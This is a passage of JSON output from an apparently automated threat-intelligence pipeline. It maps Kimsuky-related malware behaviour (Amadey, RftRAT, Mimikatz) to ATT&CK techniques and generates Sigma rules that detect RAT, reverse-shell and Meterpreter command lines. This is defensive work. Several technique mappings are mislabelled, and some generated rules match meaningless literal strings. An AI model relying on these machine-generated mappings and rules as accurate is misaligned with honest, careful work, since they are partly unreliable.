          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "605fc87c-a5f8-406a-b436-e693766c26ff",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "PowerShell",
        "attack_id": "T1086",
        "tactic": "Execution",
        "description": "Detected PowerShell activity via NLP pattern matching",
        "confidence_score": 0.654,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.116,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "ebedf6e9-5fec-4006-9a60-88bd261e535e",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "File and Directory Discovery",
        "attack_id": "T1083",
        "tactic": "Discovery",
        "description": "Amadey searches for product names from South Korean companies",
        "confidence_score": 0.653,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.207,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "product names"
        ],
        "tools": [
          "Amadey",
          "at",
          "metasploit",
          "rundll32",
          "Rundll32",
          "zip",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "e9b97de9-46e5-4285-bce5-2038925c8e0b",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Defensive Evasion",
        "attack_id": "T1112",
        "tactic": "Defensive Evasion",
        "description": "Detected use of Rundll32 for potential malicious code execution",
        "confidence_score": 0.651,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.192,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "rundll32.exe"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "ca7a0690-519e-4856-87db-205540af3c86",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "System Information Discovery",
        "attack_id": "T1082",
        "tactic": "Discovery",
        "description": "Amadey collects system information from the infected system",
        "confidence_score": 0.65,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "system information"
        ],
        "tools": [
          "Amadey",
          "at",
          "metasploit",
          "rundll32",
          "Rundll32",
          "zip",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "8f219da0-9dcf-46c0-ba3f-0fe0d563a163",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "File and Directory Discovery",
        "attack_id": "T1083",
        "tactic": "Discovery",
        "description": "RftRAT uses specific path names for saving data",
        "confidence_score": 0.65,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "A1CCA2EC-C09F-D33C-4317-7F71F0E2A976_0"
        ],
        "tools": [
          "RftRAT",
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "777df74c-3a69-4432-85a2-75e6c8eecacd",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Credential Access",
        "attack_id": "T1003",
        "tactic": "Credential Access",
        "description": "Detected use of Mimikatz for potential credential theft",
        "confidence_score": 0.647,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.169,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "mimikatz.exe"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "2187d828-5a7a-4102-b9a9-a32380c70cf0",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Collection",
        "attack_id": "T1005",
        "tactic": "Collection",
        "description": "Detected use of Keylogger for potential keystroke logging",
        "confidence_score": 0.647,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.169,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "keylogger"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "Keylogger",
          "NET",
          "ping",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "b9b61d4a-94fe-4692-9530-fd04d3466beb",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "System Information Discovery",
        "attack_id": "T1082",
        "tactic": "Discovery",
        "description": "RftRAT saves C&C communication and command results",
        "confidence_score": 0.646,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "C&C communication"
        ],
        "tools": [
          "RftRAT",
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "520d6192-7c16-4855-9c1a-401a62f27c9f",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "AutoIt script used for malicious purposes",
        "confidence_score": 0.643,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "AutoIt"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "PowerShell",
          "Mimikatz",
          "mimikatz",
          "reg",
          "AutoIt",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "5480018a-cf3b-4aca-a8d0-84fc598e600f",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Process Injection",
        "attack_id": "T1055",
        "tactic": "Defense Evasion",
        "description": "RftRAT injects into svchost.exe",
        "confidence_score": 0.642,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.092,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "svchost.exe",
          "RftRAT"
        ],
        "tools": [
          "RftRAT",
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "ae2069e2-9203-4288-ad6e-09a28b50f0ad",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Create or Modify System Process",
        "attack_id": "T1543",
        "tactic": "Persistence",
        "description": "Detected Create or Modify System Process activity via NLP pattern matching",
        "confidence_score": 0.64,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.246,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "b05a63ee-38ea-400d-b467-ed0187ca5896",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Process Injection",
        "attack_id": "T1055",
        "tactic": "Defense Evasion",
        "description": "Detected Process Injection activity via NLP pattern matching",
        "confidence_score": 0.636,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.214,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "a162f56c-5cd4-448f-a441-20bdfe826e6c",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Data Staging",
        "attack_id": "T1074",
        "tactic": "Credential Access",
        "description": "RftRAT creates an Infostealer",
        "confidence_score": 0.636,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.092,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Infostealer"
        ],
        "tools": [
          "RftRAT",
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "6e7de3a9-24b7-4341-8355-ef640f481b1b",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Obfuscated Files or Information",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "RftRAT packed in VMP",
        "confidence_score": 0.636,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.092,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "VMP"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "VMP",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "31c692b2-6165-4f44-85de-92dd9d3bd1f0",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "File Deletion",
        "attack_id": "T1107",
        "tactic": "Defense Evasion",
        "description": "RftRAT can delete files",
        "confidence_score": 0.636,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.092,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "0x06"
        ],
        "tools": [
          "RftRAT",
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "7536ef67-0d66-465a-9a66-3506e41b8077",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Application Layer Protocol",
        "attack_id": "T1071",
        "tactic": "Command And Control",
        "description": "Detected Application Layer Protocol activity via NLP pattern matching",
        "confidence_score": 0.633,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "9f06163c-88e1-43b0-9d3b-93d9400d5f4b",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Exfiltration Over C2 Channel",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "a99e9fd1-4d32-4908-817b-01d0ec059bc5",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Exploit Public-Facing Application",
        "attack_id": "T1190",
        "tactic": "Initial Access",
        "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "45b7406f-f76d-4512-b94a-8a3e6f0cbd05",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "OS Credential Dumping",
        "attack_id": "T1003",
        "tactic": "Credential Access",
        "description": "Detected OS Credential Dumping activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "a4cc84fa-1597-42db-a68f-47edae9a8d3a",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Archive Collected Data",
        "attack_id": "T1560",
        "tactic": "Collection",
        "description": "Detected Archive Collected Data activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "099f525e-72b9-46f2-8cbd-8204cedabd18",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Input Capture",
        "attack_id": "T1056",
        "tactic": "Credential Access",
        "description": "Detected Input Capture activity via NLP pattern matching",
        "confidence_score": 0.624,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.139,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "2f21ea69-78fd-4536-8791-5f385be08b83",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Screen Capture",
        "attack_id": "T1113",
        "tactic": "Collection",
        "description": "Detected Screen Capture activity via NLP pattern matching",
        "confidence_score": 0.624,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.139,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "bc33acc3-2301-4d45-bdf1-6d8b5b7cc00b",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Remote Desktop Protocol",
        "attack_id": "T1021.001",
        "tactic": "Lateral Movement",
        "description": "Detected Remote Desktop Protocol activity via NLP pattern matching",
        "confidence_score": 0.623,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.5,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "680cd5d3-7ff2-4396-a2be-b2b267e46639",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "User Execution: Malicious File",
        "attack_id": "T1204.002",
        "tactic": "Execution",
        "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
        "confidence_score": 0.621,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      }
    ]
  },
  "rules": {
    "status": "success",
    "summary": {
      "ttps_processed": 66,
      "rules_generated": 66,
      "langchain_generations": 132,
      "fallback_generations": 0,
      "errors": 0,
      "processing_time_ms": 580861.082
    },
    "rule_generation_results": [
      {
        "ttp_id": "unknown",
        "technique_name": "Remote Control Malware",
        "status": "success",
        "rule": {
          "title": "Remote Control Malware Execution by Kimsuky Group",
          "description": "Detects execution of remote control malware associated with the Kimsuky group, including custom and open-source tools such as XRat, HVNC, Amadey, and Metasploit Meterpreter. Focuses on process creation events with suspicious command-line arguments or image paths indicative of remote access tools.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_xrat": {
              "Image|endswith": [
                "\\xrat.exe",
                "\\xratclient.exe"
              ],
              "CommandLine|contains": [
                "-connect",
                "-host",
                "-ip"
              ]
            },
            "selection_hvnc": {
              "Image|endswith": [
                "\\hvnc.exe",
                "\\hiddenvnc.exe"
              ],
              "CommandLine|contains": [
                "-ip",
                "-port",
                "connect"
              ]
            },
            "selection_amadey": {
              "Image|endswith": [
                "\\amadey.exe",
                "\\loader.exe"
              ],
              "CommandLine|contains": [
                "/c",
                "/staged",
                "beacon"
              ]
            },
            "selection_meterpreter": {
              "ParentImage|endswith": [
                "\\spoolsv.exe",
                "\\dllhost.exe",
                "\\wmiprvse.exe"
              ],
              "CommandLine|contains": [
                "-M",
                "--Meterpreter",
                "stageless"
              ]
            },
            "selection_generic_rat": {
              "CommandLine|contains": [
                "-connect",
                "reverse_shell",
                "--bind",
                "--reverse",
                "-R"
              ],
              "Image|endswith": [
                ".exe"
              ],
              "Image|contains": [
                "client",
                "remote",
                "control",
                "session"
              ]
            },
            "condition": "selection_xrat or selection_hvnc or selection_amadey or selection_meterpreter or selection_generic_rat"
          },
          "falsepositives": [
            "Legitimate remote administration tools used in enterprise environments (e.g., TeamViewer, AnyDesk, VNC) if named similarly",
            "Penetration testing activities using Metasploit or similar frameworks",
            "Custom internal tools with generic names like 'client.exe' or 'remote.exe' that include 'control' in path"
          ],
          "level": "high",
          "tags": [
            "attack.t1071.001",
            "attack.t1573",
            "attack.t1055",
            "attack.t1090",
            "threat-group.kimsuky",
            "malware.remote_access",
            "sigma.rule"
          ],
          "ttp_id": "unknown",
          "technique_name": "Remote Control Malware",
          "generation_method": "langchain",
          "id": "e91568c2-0c4e-4546-a2f1-2ba5a6e30fad"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Spear Phishing Attack",
        "status": "success",
        "rule": {
          "title": "Kimsuky Group Spear Phishing Attack via LNK and Compressed Files",
          "description": "Detects spear phishing attacks associated with the Kimsuky group using LNK shortcut files and compressed archives to initiate initial access, particularly targeting defense, diplomatic, and academic sectors. Focuses on suspicious process creation patterns from email-adjacent activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_lnk_execution": {
              "Image|endswith": "\\cmd.exe",
              "ParentImage|endswith": "\\explorer.exe",
              "CommandLine|contains": ".lnk"
            },
            "selection_compressed_exec": {
              "CommandLine|contains": [
                "cmd.exe",
                "powershell.exe",
                "wscript.exe",
                "rundll32.exe"
              ]
            },
            "selection_office_spawn_shell": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\rundll32.exe"
              ]
            },
            "condition": "selection_lnk_execution or selection_compressed_exec or selection_office_spawn_shell"
          },
          "falsepositives": [
            "Legitimate user execution of compressed scripts from trusted sources",
            "Administrative use of command-line tools after opening email attachments",
            "Automated document processing systems that spawn shells from Office applications"
          ],
          "level": "high",
          "tags": [
            "attack.t1566",
            "attack.initial_access",
            "threat.kimsuky",
            "phishing.spear",
            "custom.lnk_attack",
            "custom.compressed_payload"
          ],
          "ttp_id": "unknown",
          "technique_name": "Spear Phishing Attack",
          "generation_method": "langchain",
          "id": "eea49885-0a6d-446e-82dd-13af19fcb895"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "LNK Malware",
        "status": "success",
        "rule": {
          "title": "LNK Malware Execution with Script Decompression",
          "description": "Detects LNK file execution that triggers decompression of encrypted archives followed by execution of script-based malware. This behavior is commonly observed in LNK-based malware payloads that embed compressed malicious scripts.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_lnk_execution": {
              "Image|endswith": "\\cmd.exe",
              "ParentImage|endswith": "\\explorer.exe"
            },
            "selection_decompression": {
              "CommandLine|contains": "-r"
            },
            "selection_script_execution": {
              "CommandLine|contains": "powershell"
            },
            "condition": "selection_lnk_execution and selection_decompression and selection_script_execution"
          },
          "falsepositives": [
            "Legitimate use of LNK files to launch scripts via command line utilities",
            "Administrative scripts that use expand command for legitimate archive extraction"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1204.002",
            "attack.g0071",
            "malware.lnk",
            "malware.compression"
          ],
          "ttp_id": "unknown",
          "technique_name": "LNK Malware",
          "generation_method": "langchain",
          "id": "e67002f7-30ff-45ef-95ef-913cce5c63c2"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Persistence",
        "status": "success",
        "rule": {
          "title": "Persistence Script and Downloader Execution",
          "description": "Detects execution of a persistence script and a downloader that retrieves and executes additional payloads from an external source. This behavior is associated with persistence and initial access tactics.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_persistence": {
              "CommandLine|contains": [
                "persistence script",
                "script for maintaining persistence"
              ]
            },
            "selection_downloader": {
              "CommandLine|contains": [
                "downloader",
                "downloads and executes additional payloads"
              ]
            },
            "condition": "selection_persistence or selection_downloader"
          },
          "falsepositives": [
            "Legitimate system administration scripts that reference persistence mechanisms or download tools for patching/maintenance",
            "Automated update scripts that download and execute payloads in secure environments"
          ],
          "level": "high",
          "tags": [
            "attack.persistence",
            "attack.t1053",
            "attack.t1071",
            "attack.command_and_control"
          ],
          "ttp_id": "unknown",
          "technique_name": "Persistence",
          "generation_method": "langchain",
          "id": "4aa8efd7-96cd-4b46-b867-fcf641f0bb26"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Proxy",
        "status": "success",
        "rule": {
          "title": "Proxy Malware Establishing RDP Connection",
          "description": "Detects proxy malware establishing an RDP connection to a private network by leveraging suspicious executable and configuration file patterns.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_image": {
              "Image|endswith": "\\svc.exe"
            },
            "selection_config": {
              "CommandLine|contains": "setting.ini"
            },
            "selection_port": {
              "CommandLine|contains": "3389"
            },
            "condition": "selection_image and selection_config and selection_port"
          },
          "falsepositives": [
            "Legitimate service binaries named svc.exe running with configuration files and RDP-related command-line arguments (rare)",
            "Administrative scripts managing RDP connections using non-standard executables"
          ],
          "level": "high",
          "tags": [
            "attack.t1090",
            "attack.command-and-control",
            "custom.proxy",
            "custom.rdp",
            "custom.malware"
          ],
          "ttp_id": "unknown",
          "technique_name": "Proxy",
          "generation_method": "langchain",
          "id": "1a06f7e6-e8d8-4161-bbc0-3c5fd129a0bf"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Persistence",
        "status": "success",
        "rule": {
          "title": "Amadey Malware Persistence via svc.vbs in Startup Folder",
          "description": "Detects Amadey malware persistence mechanism by creating 'svc.vbs' script in the %ALLUSERSPROFILE%\\Startup directory",
          "logsource": {
            "category": "file_event",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "TargetFilename|endswith": "\\Startup\\svc.vbs",
              "Image|endswith": "\\svchost.exe"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative scripts placed in the All Users Startup folder (rare)",
            "Manual creation of a file named svc.vbs in the Startup directory by a user or administrator"
          ],
          "level": "high",
          "tags": [
            "attack.persistence",
            "attack.T1547.005",
            "malware.amadey"
          ],
          "ttp_id": "unknown",
          "technique_name": "Persistence",
          "generation_method": "langchain",
          "id": "65864945-717b-49ee-ba19-2fbd8da9ddbb"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Remote Control Malware",
        "status": "success",
        "rule": {
          "title": "Remote Control Malware Execution by Kimsuky Group",
